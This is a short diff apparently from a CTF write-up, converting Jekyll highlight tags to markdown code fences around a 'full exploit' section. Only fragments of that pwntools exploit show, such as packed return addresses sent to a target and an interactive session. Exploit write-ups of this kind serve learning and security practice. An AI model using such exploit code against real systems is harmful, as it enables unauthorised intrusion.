@@ -201,7 +201,7 @@ RECV:MSLSA ..<alot of A>.. A$ SpacesInsteadOfTabs?!
 ```
 ## full exploit:
 
-% highlight python %
+```python
 #!/usr/bin/python
 
 from pwn import *
@@ -235,5 +235,5 @@ r.send(p32(raplus1) + p32(return_addr) \
 r.interactive()
 
 r.close()
-% endhighlight %
+```
 
